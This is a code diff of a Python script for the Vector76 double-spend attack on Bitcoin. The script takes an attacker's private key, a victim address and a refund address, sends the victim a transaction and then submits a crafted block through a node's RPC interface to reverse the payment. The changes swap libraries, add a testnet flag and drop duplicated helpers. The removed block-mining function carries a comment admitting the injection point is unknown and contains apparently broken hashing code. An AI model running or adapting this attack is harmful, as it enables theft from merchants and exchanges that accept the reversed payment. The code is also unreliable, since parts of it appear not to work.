@@ -1,13 +1,10 @@
 import argparse
 import requests
 import subprocess
+import bitcoin.rpc
+import bitcoin.core
 
-from bitcoin.rpc import Proxy
-from bitcoin import *
-from datetime import datetime
-from hashlib import sha256
-
-testnet = True #Network Option
+import cryptos
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
 parser.add_argument("node_host",
@@ -17,17 +14,17 @@ parser.add_argument("node_port",
                     help="Blockchain Node Port",
                     type=int)
 parser.add_argument("username",
-                    help="public node username",
+                    help="Public node username",
                     type=str)
 parser.add_argument("password",
-                    help="public node password",
+                    help="Public node password",
                     type=str)
 
 parser.add_argument("attacker_signkey",
                     help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
                     type=str)
 parser.add_argument("victim_address",
-                    help="victim address.",
+                    help="Victim address.",
                     type=str)
 parser.add_argument("attacker_address",
                     help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
@@ -38,6 +35,10 @@ parser.add_argument("amount_of_coins",
 parser.add_argument("last_UXTO",
                     help="Last UXTO of first attacker address",
                     type=str)
+parser.add_argument("--is_testnet",
+                    help="testnet flag (Default=True)",
+                    default=True,
+                    type=bool)
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
@@ -59,124 +60,6 @@ def broadcast_transaction(raw_tx, testnet):
     else:
         print(f"Failed to broadcast transaction. Status code: {response.status_code}")
 
-def get_block_header_by_txid(txid, network):
-    # URL to get transaction information
-    tx_url = f'https://api.blockcypher.com/v1/btc/{network}/txs/{txid}'
-    
-    # Request transaction information
-    tx_response = requests.get(tx_url)
-    if tx_response.status_code != 200:
-        print(f"Error while retrieving transaction information: {tx_response.status_code}")
-        return
-    
-    tx_data = tx_response.json()
-    
-    # Obtaining a block hash from transaction data
-    block_hash = tx_data.get('block_hash')
-    if not block_hash:
-        print("Transaction not found in block.")
-        return
-    
-    # URL to get block information
-    block_url = f'https://api.blockcypher.com/v1/btc/{network}/blocks/{block_hash}'
-    
-    # Request information about a block
-    block_response = requests.get(block_url)
-    if block_response.status_code != 200:
-        print(f"Error while retrieving block information: {block_response.status_code}")
-        return
-    
-    block_data = block_response.json()
-    
-    # Getting Block Header
-    block_header = {
-        'Block': block_data.get('hash'),
-        'Block Height': block_data.get('height'),
-        'Mined Time': block_data.get('time'),
-        'Prev Block': block_data.get('prev_block'),
-        'Merkle Root': block_data.get('mrkl_root'),
-        'Nonce': block_data.get('nonce'),
-        'Bits': block_data.get('bits'),
-        'Version': block_data.get('ver')
-    }
-    print(f"Block: {block_data.get('hash')}")
-    print(f"Block Height: {block_data.get('height')}")
-    print(f"Mined Time: {block_data.get('time')}")
-    print(f"Prev Block :  {block_data.get('prev_block')}")
-    print(f"Merkle Root : {block_data.get('mrkl_root')}")
-    print(f"Nonce: {block_data.get('nonce')}")
-    print(f"Bits: {block_data.get('bits')}")
-    print(f"Version: {block_data.get('ver')}")
-    return block_header
-
-
-
-def mine_vector76_block(block_header_V, inject_tx):
-    version_hex    = format(block_header_V["Version"], "08x")[::-1]
-    #block_hex      = block_header_V["Block"][::-1]
-    #height_hex = format(block_header_V["Block Heihgt"], "x")[::-1]
-    prev_block_hex = block_header_V["Prev Block"][::-1]
-    markle_root_hex = block_header_V["Merkle Root"][::-1]
-    timestamp_s = int((datetime.strptime(block_header_V["Mined Time"], "%Y-%m-%d %H:%M:%S")-datetime(1970,1,1)).total_seconds())
-    timestamp_hex = format(timestamp_s,"x")[::-1]
-    bits_hex  = format(block_header_V["Bits"], "x")[::-1]
-    nonce_hex = format(block_header_V["Nonce"], "x")[::-1]
-
-    # 金融庁の資料によると、一つ目のトランザクションを含めてマイニンングするらしいが挿入する箇所はわかっていない。
-    vector76_blockheader = f"{version_hex}{prev_block_hex}{markle_root_hex}{timestamp_hex}{bits_hex}{inject_tx}{nonce_hex}"
-    block_hash = sha256(sha256(vector76_blockheader).digest()).digest()[::-1].encode("hex")
-    print(f"Block Hash : {block_hash}")
-    return block_hash
-
-def get_block_header_by_txid(txid, network):
-    # URL to get transaction information
-    tx_url = f'https://api.blockcypher.com/v1/btc/{network}/txs/{txid}'
-    
-    # Request transaction information
-    tx_response = requests.get(tx_url)
-    if tx_response.status_code != 200:
-        print(f"Error while retrieving transaction information: {tx_response.status_code}")
-        return
-    
-    tx_data = tx_response.json()
-    
-    # Obtaining a block hash from transaction data
-    block_hash = tx_data.get('block_hash')
-    if not block_hash:
-        print("Transaction not found in block.")
-        return
-    
-    # URL to get block information
-    block_url = f'https://api.blockcypher.com/v1/btc/{network}/blocks/{block_hash}'
-    
-    # Request information about a block
-    block_response = requests.get(block_url)
-    if block_response.status_code != 200:
-        print(f"Error while retrieving block information: {block_response.status_code}")
-        return
-    
-    block_data = block_response.json()
-    
-    # Getting Block Header
-    block_header = {
-        'Block': block_data.get('hash'),
-        'Block Height': block_data.get('height'),
-        'Mined Time': block_data.get('time'),
-        'Prev Block': block_data.get('prev_block'),
-        'Merkle Root': block_data.get('mrkl_root'),
-        'Nonce': block_data.get('nonce'),
-        'Bits': block_data.get('bits'),
-        'Version': block_data.get('ver')
-    }
-    print(f"Block: {block_data.get('hash')}")
-    print(f"Block Height: {block_data.get('height')}")
-    print(f"Mined Time: {block_data.get('time')}")
-    print(f"Prev Block :  {block_data.get('prev_block')}")
-    print(f"Merkle Root : {block_data.get('mrkl_root')}")
-    print(f"Nonce: {block_data.get('nonce')}")
-    print(f"Bits: {block_data.get('bits')}")
-    print(f"Version: {block_data.get('ver')}")
-    return block_header
 
 args = parser.parse_args()
 rpc_host = args.node_host
@@ -189,15 +72,13 @@ victim_address   = args.victim_address
 attacker_address = args.attacker_address
 last_txid  = args.last_UXTO
 amount_btc = args.amount_of_coins
+testnet    = args.is_testnet
 
 
 fee = 15000
-transaction_util = bitcoin.core(testnet=testnet)
-bitcoin.SelectParams("mainnet")
-if testnet:
-    bitcoin.SelectParams("testnet")
+transaction_util = cryptos.Bitcoin(testnet=testnet)
 print("Connecting Public Node...")
-rpc_node = Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
+rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
                  service_port=rpc_port)
 print(rpc_node.getinfo())
 print("OK")
@@ -245,7 +126,6 @@ print()
 print("OK")
 print("push V1 TX...")
 broadcast_transaction(tx_victim, testnet)
-#print()
 input("--- Send the block after pressing the enter key. --- ")
 print(f"Send Vector76 Block...")
 result = rpc_node.submitblock(tx_vector76)
